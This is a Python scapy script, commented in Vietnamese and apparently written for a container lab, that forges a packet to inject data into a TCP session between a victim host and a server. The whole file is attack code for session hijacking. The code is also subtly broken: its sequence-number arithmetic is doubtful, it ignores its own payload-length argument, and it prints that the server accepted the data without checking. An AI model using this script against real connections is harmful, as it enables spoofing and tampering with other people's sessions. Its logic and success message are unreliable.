#!/usr/bin/env python3
"""Chen goi tin du lieu du doan vao phien TCP victim -> server.
Chay tren container attacker (can root):
  sudo python3 pred-hijack.py <seq> <ack> <sport> <payload_len>
Trong do:
  - <seq> = so sequence hien tai cua victim (tu pcap)
  - <ack> = so acknowledgment hien tai cua server
  - <sport> = cordon nguon cua victim
  - <payload_len> = do dai payload can chen (vi du: 6 byte cho HELLO\\n)"""

import sys
from scapy.all import IP, TCP, send

VICTIM = '172.21.0.2'
SERVER = '172.21.0.3'
DPORT = 9999

def main():
    if len(sys.argv) != 5:
        print('Dung: sudo python3 pred-hijack.py <seq> <ack> <sport> <payload_len>')
        sys.exit(2)
    seq, ack, sport, plen = int(sys.argv[1]), int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
    
    # Tinh seq tiep theo
    next_seq = seq + plen + 1
    
    # Tao goi tin du lieu
    payload = b'HELLO\n'
    
    pkt = (IP(src=VICTIM, dst=SERVER)
           / TCP(sport=sport, dport=DPORT, flags='PA', seq=next_seq, ack=ack)
           / payload)
    send(pkt, verbose=False)
    print('Da chen du lieu seq=%d ack=%d sport=%d len=%d -> server da chap nhan' % (next_seq, ack, sport, len(payload)))

if __name__ == '__main__':
    main()
